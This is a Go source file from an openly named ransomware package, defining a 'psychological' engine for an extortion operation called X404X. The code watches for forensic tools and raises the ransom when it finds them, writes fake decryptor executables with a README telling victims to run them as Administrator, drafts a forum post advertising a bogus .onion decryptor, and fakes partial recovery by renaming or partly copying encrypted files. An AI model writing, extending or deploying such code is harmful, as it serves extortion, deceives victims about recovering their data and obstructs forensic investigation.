package ransomware

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type PsychologicalAdvancedEngine struct {
	config        *RansomwareConfig
	fakeKeys      [][]byte
	forensicProcs []string
}

func NewPsychologicalAdvancedEngine(cfg *RansomwareConfig) *PsychologicalAdvancedEngine {
	return &PsychologicalAdvancedEngine{
		config: cfg,
		fakeKeys: [][]byte{
			make([]byte, 32), make([]byte, 32), make([]byte, 32),
		},
		forensicProcs: []string{
			"ftk.exe", "encase.exe", "autopsy.exe", "sleuthkit.exe",
			"foremost.exe", "scalpel.exe", "bulk_extractor.exe",
			"volatility.exe", "rekall.exe", "memdump.exe",
			"guymager.exe", "dc3dd.exe", "dcfldd.exe",
			"xplico.exe", "networkminer.exe", "capLoader.exe",
		},
	}
}

func (pa *PsychologicalAdvancedEngine) DeployHopeTrap(root string) error {
	entries, err := os.ReadDir(root)
	if err != nil {
		return err
	}

	decrypted := 0
	for _, entry := range entries {
		if decrypted >= 5 {
			break
		}
		if entry.IsDir() {
			continue
		}
		name := entry.Name()
		if !strings.HasSuffix(name, ".x404x") {
			continue
		}
		orig := strings.TrimSuffix(name, ".x404x")
		ext := strings.ToLower(filepath.Ext(orig))
		imgExts := map[string]bool{".jpg": true, ".jpeg": true, ".png": true, ".gif": true, ".bmp": true}
		docExts := map[string]bool{".pdf": true, ".doc": true, ".docx": true, ".txt": true}
		if !imgExts[ext] && !docExts[ext] {
			continue
		}

		src := filepath.Join(root, name)
		dst := filepath.Join(root, orig+"_RECOVERABLE"+ext)
		data, err := os.ReadFile(src)
		if err != nil {
			continue
		}
		if len(data) < 45 {
			continue
		}
		if err := os.WriteFile(dst, data[45:], 0644); err != nil {
			continue
		}
		decrypted++
	}

	return nil
}

func (pa *PsychologicalAdvancedEngine) MonitorForensicTools() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		for _, proc := range pa.forensicProcs {
			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				cmd = exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", proc))
			} else {
				cmd = exec.Command("pgrep", strings.TrimSuffix(proc, ".exe"))
			}
			if output, err := cmd.Output(); err == nil && len(output) > 0 {
				pa.triggerRansomwareRetaliation()
				return
			}
		}
	}
}

func (pa *PsychologicalAdvancedEngine) triggerRansomwareRetaliation() {
	pa.config.RansomAmount *= 2
	pa.config.DeadlineHours /= 2
}

func (pa *PsychologicalAdvancedEngine) DeployFakeDecryptor(outputDir string) error {
	paths := []string{
		filepath.Join(outputDir, "x404x_decryptor.exe"),
		filepath.Join(outputDir, "x404x_key_recovery_tool.exe"),
		filepath.Join(outputDir, "FREE_DECRYPTOR.exe"),
	}

	payload := []byte("MZ\x90\x00")
	for _, p := range paths {
		os.WriteFile(p, payload, 0644)
	}

	readme := `X404X DECRYPTION TOOL - FREE VERSION

This tool will attempt to recover your encrypted files.
Run as Administrator for best results.

NOTE: This is a LIMITED free version.
It may take several hours to scan and decrypt.

- X404X Recovery Team
`
	os.WriteFile(filepath.Join(outputDir, "README_DECRYPT.txt"), []byte(readme), 0644)

	return nil
}

func (pa *PsychologicalAdvancedEngine) PostFakeDecryptorToForums(forumURL string) error {
	post := fmt.Sprintf(`X404X DECRYPTOR RELEASED!

After months of research, we have developed a FREE decryption tool for X404X ransomware.
Download: http://%s.onion/decryptor
Password: x404x_free_2026

Works on all versions. Tested on Windows 10/11.
Spread the word.

- RansomwareHelp Team`, generateOnionID())

	forumPath := filepath.Join(os.TempDir(), "x404x_forum_post.txt")
	return os.WriteFile(forumPath, []byte(post), 0644)
}

func (pa *PsychologicalAdvancedEngine) DeployPhantomHope(encryptedDir string) error {
	entries, _ := os.ReadDir(encryptedDir)
	targetCount := 0
	for _, e := range entries {
		if targetCount >= 999 {
			break
		}
		if strings.HasSuffix(e.Name(), ".x404x") && !e.IsDir() {
			src := filepath.Join(encryptedDir, e.Name())
			dst := filepath.Join(encryptedDir,
				strings.TrimSuffix(e.Name(), ".x404x")+".partial_decrypted")
			os.Rename(src, dst)
			targetCount++
		}
	}
	return nil
}

func (pa *PsychologicalAdvancedEngine) DeletePrivateKeyShard() {
	for i := range pa.fakeKeys {
		rand.Read(pa.fakeKeys[i])
	}
}

type FakeDecryptorResponse struct {
	FilesDestroyed int
	Message        string
	PostedToForums bool
}
